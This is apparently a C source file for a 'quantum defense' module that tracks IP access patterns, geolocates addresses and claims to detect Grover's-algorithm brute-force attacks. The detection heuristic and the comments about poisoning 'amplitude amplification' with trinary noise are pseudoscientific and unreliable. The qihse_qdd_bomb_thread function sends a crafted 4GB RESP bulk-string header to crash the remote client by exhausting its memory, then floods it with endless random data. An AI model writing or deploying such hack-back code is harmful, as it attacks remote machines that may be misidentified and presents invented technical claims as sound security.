#include "qihse_quantum_defense.h"
#include "qihse_mmdb.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include "qihse_platform.h"
#include "qihse_audit.h"
#ifndef _WIN32
#include <pthread.h>
#endif
#ifndef _WIN32
#include <openssl/rand.h>
#endif

#define QDD_HISTORY_SIZE 1024
#define QDD_THREAT_THRESHOLD 85
#define QDD_IP_CACHE_SIZE 256
#define FNV_OFFSET_BASIS 14695981039346656037ULL
#define FNV_PRIME 1099511628211ULL

/* Trinary states for quantum disruption: -1 (False), 0 (Superposition), 1 (True) */
typedef int8_t tryte_t;

typedef struct {
    char ip[64];
    uint32_t threat_contribution;
    uint64_t last_access_time;
    uint32_t burst_count;
    char country[3];
    char city[64];
    char asn[64];
} qihse_qdd_ip_threat_t;

struct qihse_quantum_defense_ctx_t {
    pthread_mutex_t lock;
    uint64_t access_history[QDD_HISTORY_SIZE];
    uint64_t access_timestamps[QDD_HISTORY_SIZE];
    uint32_t head;
    uint32_t threat_level; /* 0 to 100 */
    bool under_attack;
    qihse_qdd_ip_threat_t ip_threats[QDD_IP_CACHE_SIZE];
    uint32_t ip_threat_count;
    qihse_mmdb_t* mmdb_country;
    qihse_mmdb_t* mmdb_city;
    qihse_mmdb_t* mmdb_asn;
    bool mmdb_advisory_printed;
};

/* Forward declaration for geoip_lookup_ctx (defined later) */
static bool qihse_qdd_geoip_lookup_ctx(qihse_quantum_defense_ctx_t* ctx,
                                        const char* ip,
                                        char* out_country, size_t country_len,
                                        char* out_city,    size_t city_len,
                                        char* out_asn,     size_t asn_len);

static uint64_t qihse_qdd_fnv1a_hash(const char* key) {
    if (!key) return 0;
    uint64_t hash = FNV_OFFSET_BASIS;
    for (const unsigned char* p = (const unsigned char*)key; *p; ++p) {
        hash ^= (uint64_t)*p;
        hash *= FNV_PRIME;
    }
    return hash;
}

static void qihse_qdd_track_ip_threat(qihse_quantum_defense_ctx_t* ctx, const char* ip) {
    if (!ctx || !ip) return;
    
    uint64_t now = (uint64_t)time(NULL);
    
    for (uint32_t i = 0; i < ctx->ip_threat_count; i++) {
        if (strcmp(ctx->ip_threats[i].ip, ip) == 0) {
            uint64_t time_delta = now - ctx->ip_threats[i].last_access_time;
            if (time_delta < 1) {
                ctx->ip_threats[i].burst_count++;
                if (ctx->ip_threats[i].burst_count > 10) {
                    ctx->ip_threats[i].threat_contribution += 5;
                }
            } else {
                ctx->ip_threats[i].burst_count = 1;
            }
            ctx->ip_threats[i].last_access_time = now;
            return;
        }
    }
    
    if (ctx->ip_threat_count < QDD_IP_CACHE_SIZE) {
        strncpy(ctx->ip_threats[ctx->ip_threat_count].ip, ip, sizeof(ctx->ip_threats[0].ip) - 1);
        ctx->ip_threats[ctx->ip_threat_count].threat_contribution = 0;
        ctx->ip_threats[ctx->ip_threat_count].last_access_time = now;
        ctx->ip_threats[ctx->ip_threat_count].burst_count = 1;
        
        qihse_qdd_ip_threat_t* entry = &ctx->ip_threats[ctx->ip_threat_count];
        qihse_qdd_geoip_lookup_ctx(ctx, ip,
                                   entry->country, sizeof(entry->country),
                                   entry->city,    sizeof(entry->city),
                                   entry->asn,     sizeof(entry->asn));
        
        char geo_details[256];
        snprintf(geo_details, sizeof(geo_details), "IP %s from %s/%s (ASN: %s)", ip,
                 entry->country, entry->city, entry->asn);
        qihse_qdd_audit_log("IP_THREAT_TRACKED", geo_details);
        
        ctx->ip_threat_count++;
    }
}

qihse_quantum_defense_ctx_t* qihse_qdd_init(void) {
    qihse_quantum_defense_ctx_t* ctx = calloc(1, sizeof(*ctx));
    if (!ctx) return NULL;
    pthread_mutex_init(&ctx->lock, NULL);

    ctx->mmdb_country = qihse_mmdb_open("data/geolite2/GeoLite2-Country.mmdb");
    ctx->mmdb_city    = qihse_mmdb_open("data/geolite2/GeoLite2-City.mmdb");
    ctx->mmdb_asn     = qihse_mmdb_open("data/geolite2/GeoLite2-ASN.mmdb");

    if (!ctx->mmdb_country || !ctx->mmdb_city || !ctx->mmdb_asn) {
        fprintf(stderr,
            "\n[QIHSE QDD] GeoIP databases not found or incomplete.\n"
            "  Download free GeoLite2 databases (requires free MaxMind account):\n"
            "  https://dev.maxmind.com/geoip/geolite2-free-geolocation-data\n"
            "  Place the following files in data/geolite2/ relative to the working directory:\n"
            "    GeoLite2-Country.mmdb\n"
            "    GeoLite2-City.mmdb\n"
            "    GeoLite2-ASN.mmdb\n"
            "  Geolocation attribution will be disabled until databases are present.\n\n");
        ctx->mmdb_advisory_printed = true;
    }

    return ctx;
}

void qihse_qdd_free(qihse_quantum_defense_ctx_t* ctx) {
    if (ctx) {
        qihse_mmdb_close(ctx->mmdb_country);
        qihse_mmdb_close(ctx->mmdb_city);
        qihse_mmdb_close(ctx->mmdb_asn);
        pthread_mutex_destroy(&ctx->lock);
        free(ctx);
    }
}

void qihse_qdd_report_access(qihse_quantum_defense_ctx_t* ctx, uint64_t target_id, const char* accessor_ip) {
    if (!ctx) return;
    
    pthread_mutex_lock(&ctx->lock);
    
    if (accessor_ip) {
        qihse_qdd_track_ip_threat(ctx, accessor_ip);
    }
    
    uint64_t now = (uint64_t)time(NULL);
    uint64_t key_hash = target_id;
    ctx->access_history[ctx->head] = key_hash;
    ctx->access_timestamps[ctx->head] = now;
    
    ctx->head = (ctx->head + 1) % QDD_HISTORY_SIZE;
    
    /* 
     * Grover's Algorithm Detection Heuristic:
     * Quantum parallel brute-force attacks often manifest as perfectly distributed,
     * high-velocity state queries across orthogonal ID spaces.
     * Here, we analyze the access variance using a Trinary differential.
     */
    int equidistant_hits = 0;
    for (int i = 0; i < 10; i++) {
        uint32_t idx1 = (ctx->head - 1 - i + QDD_HISTORY_SIZE) % QDD_HISTORY_SIZE;
        uint32_t idx2 = (ctx->head - 2 - i + QDD_HISTORY_SIZE) % QDD_HISTORY_SIZE;
        
        uint64_t diff = ctx->access_history[idx1] ^ ctx->access_history[idx2];
        
        /* If queries are exploring mathematically perfectly structured Hamming distances... */
        if (__builtin_popcountll(diff) == 1 || diff == 0) {
            equidistant_hits++;
        }
    }
    
    if (equidistant_hits > 6) {
        ctx->threat_level += 15;
    } else if (ctx->threat_level > 0) {
        ctx->threat_level -= 1; // Decay
    }
    
    if (ctx->threat_level > 100) ctx->threat_level = 100;
    
    if (ctx->threat_level >= QDD_THREAT_THRESHOLD && !ctx->under_attack) {
        char details[256];
        snprintf(details, sizeof(details), "Threat level %u - Suspected Grover's Algorithm attack detected", ctx->threat_level);
        qihse_qdd_audit_log("QUANTUM_ATTACK_DETECTED", details);
        ctx->under_attack = true;
    } else if (ctx->threat_level < (QDD_THREAT_THRESHOLD / 2) && ctx->under_attack) {
        qihse_qdd_audit_log("THREAT_SUBSIDED", "Resuming classical operations");
        ctx->under_attack = false;
    }
    
    pthread_mutex_unlock(&ctx->lock);
}

bool qihse_qdd_is_under_attack(qihse_quantum_defense_ctx_t* ctx) {
    if (!ctx) return false;
    pthread_mutex_lock(&ctx->lock);
    bool attack = ctx->under_attack;
    pthread_mutex_unlock(&ctx->lock);
    return attack;
}

void qihse_qdd_generate_honeypot_response(char* out_buffer, size_t max_len) {
    if (!out_buffer || max_len < 16) return;
    
    /* 
     * To defeat a quantum algorithm, we inject mathematically valid but 
     * computationally destructive garbage that poisons their amplitude amplification.
     */
    unsigned char random_bytes[256];
    size_t fetch_len = (max_len > sizeof(random_bytes)) ? sizeof(random_bytes) : max_len - 1;
    
    RAND_bytes(random_bytes, fetch_len);
    
    /* Convert to Trinary-encoded ASCII payload (-1, 0, 1 mapped to chars) */
    for (size_t i = 0; i < fetch_len; i++) {
        tryte_t val = (random_bytes[i] % 3) - 1;
        if (val == -1) out_buffer[i] = '-';
        else if (val == 0) out_buffer[i] = '0';
        else out_buffer[i] = '+';
    }
    out_buffer[fetch_len] = '\0';
}

#include <sys/socket.h>

typedef struct {
    int attacker_fd;
} qihse_qdd_bomb_args_t;

static void* qihse_qdd_bomb_thread(void* arg) {
    qihse_qdd_bomb_args_t* args = (qihse_qdd_bomb_args_t*)arg;
    int attacker_fd = args->attacker_fd;
    free(args);
    
    char details[128];
    snprintf(details, sizeof(details), "Executing OOM bomb against socket %d", attacker_fd);
    qihse_qdd_audit_log("ACTIVE_MEASURE_EXECUTED", details);
    
    /* 
     * ACTIVE MEASURES DOCTRINE:
     * We don't just say "go away". We remove their capability to attack.
     * We send a maliciously crafted RESP/Postgres header claiming a 4GB payload,
     * forcing their client's parsing library (e.g., Python, Rust, Go) to immediately
     * allocate massive blocks of memory, causing an Out-Of-Memory (OOM) crash on their system.
     */
     
    // Malicious RESP Bulk String Header: "$4294967295\r\n" (4GB allocation)
    const char* oom_bomb_header = "$4294967295\r\n";
    send(attacker_fd, oom_bomb_header, strlen(oom_bomb_header), MSG_NOSIGNAL);
    
    // Follow up by streaming infinite randomized trinary noise to tie up their CPU
    // and network buffers permanently until their kernel kills the process.
    unsigned char chaotic_noise[8192];
    RAND_bytes(chaotic_noise, sizeof(chaotic_noise));
    
    while (1) {
        // Blasting the noise. MSG_NOSIGNAL prevents SIGPIPE if they crash.
        ssize_t sent = send(attacker_fd, chaotic_noise, sizeof(chaotic_noise), MSG_NOSIGNAL);
        if (sent <= 0) {
            qihse_qdd_audit_log("TARGET_NEUTRALIZED", "Attacker connection severed or crashed");
            close(attacker_fd);
            break;
        }
    }
    
    return NULL;
}

void qihse_qdd_execute_active_measure(int attacker_fd) {
    if (attacker_fd < 0) return;
    
    qihse_qdd_bomb_args_t* args = malloc(sizeof(*args));
    if (!args) {
        close(attacker_fd);
        return;
    }
    args->attacker_fd = attacker_fd;
    
    pthread_t bomb_thread;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    
    if (pthread_create(&bomb_thread, &attr, qihse_qdd_bomb_thread, args) != 0) {
        free(args);
        close(attacker_fd);
    }
    
    pthread_attr_destroy(&attr);
}

uint32_t qihse_qdd_get_threat_level(qihse_quantum_defense_ctx_t* ctx) {
    if (!ctx) return 0;
    pthread_mutex_lock(&ctx->lock);
    uint32_t level = ctx->threat_level;
    pthread_mutex_unlock(&ctx->lock);
    return level;
}

qihse_qdd_response_tier_t qihse_qdd_get_response_tier(qihse_quantum_defense_ctx_t* ctx) {
    uint32_t threat = qihse_qdd_get_threat_level(ctx);
    
    if (threat >= 85) {
        return QIHSE_QDD_RESPONSE_ACTIVE;
    } else if (threat >= 75) {
        return QIHSE_QDD_RESPONSE_HONEYPOT;
    } else if (threat >= 50) {
        return QIHSE_QDD_RESPONSE_THROTTLE;
    } else {
        return QIHSE_QDD_RESPONSE_NORMAL;
    }
}

void qihse_qdd_audit_log(const char* event_type, const char* details) {
    if (!event_type) return;
    
    char audit_msg[512];
    snprintf(audit_msg, sizeof(audit_msg), "[QDD] %s: %s", event_type, details ? details : "");
    
    qihse_audit_log(audit_msg, 0, 0, 0, 0);
}

bool qihse_qdd_geoip_lookup(const char* ip, char* out_country, char* out_city, char* out_asn) {
    (void)ip; (void)out_country; (void)out_city; (void)out_asn;
    return false; /* Context-unaware; use qihse_qdd_geoip_lookup_ctx instead */
}

static bool qihse_qdd_geoip_lookup_ctx(qihse_quantum_defense_ctx_t* ctx,
                                        const char* ip,
                                        char* out_country, size_t country_len,
                                        char* out_city,    size_t city_len,
                                        char* out_asn,     size_t asn_len) {
    if (!ctx || !ip) return false;

    bool ok = false;

    if (out_country && country_len > 0) {
        out_country[0] = '\0';
        if (ctx->mmdb_country) {
            const char* kp[] = {"country", "iso_code", NULL};
            if (qihse_mmdb_lookup_string(ctx->mmdb_country, ip, kp,
                                         out_country, country_len)) {
                ok = true;
            } else {
                snprintf(out_country, country_len, "XX");
            }
        } else {
            snprintf(out_country, country_len, "XX");
        }
    }

    if (out_city && city_len > 0) {
        out_city[0] = '\0';
        if (ctx->mmdb_city) {
            const char* kp[] = {"city", "names", "en", NULL};
            if (qihse_mmdb_lookup_string(ctx->mmdb_city, ip, kp,
                                         out_city, city_len)) {
                ok = true;
            } else {
                snprintf(out_city, city_len, "Unknown");
            }
        } else {
            snprintf(out_city, city_len, "Unknown");
        }
    }

    if (out_asn && asn_len > 0) {
        out_asn[0] = '\0';
        if (ctx->mmdb_asn) {
            const char* kp[] = {"autonomous_system_organization", NULL};
            if (qihse_mmdb_lookup_string(ctx->mmdb_asn, ip, kp,
                                         out_asn, asn_len)) {
                ok = true;
            } else {
                snprintf(out_asn, asn_len, "Unknown");
            }
        } else {
            snprintf(out_asn, asn_len, "Unknown");
        }
    }

    return ok;
}

const char* qihse_qdd_get_threat_location(qihse_quantum_defense_ctx_t* ctx, const char* ip) {
    if (!ctx || !ip) return NULL;
    
    pthread_mutex_lock(&ctx->lock);
    
    for (uint32_t i = 0; i < ctx->ip_threat_count; i++) {
        if (strcmp(ctx->ip_threats[i].ip, ip) == 0) {
            const char* country = ctx->ip_threats[i].country;
            pthread_mutex_unlock(&ctx->lock);
            return country;
        }
    }
    
    pthread_mutex_unlock(&ctx->lock);
    return NULL;
}
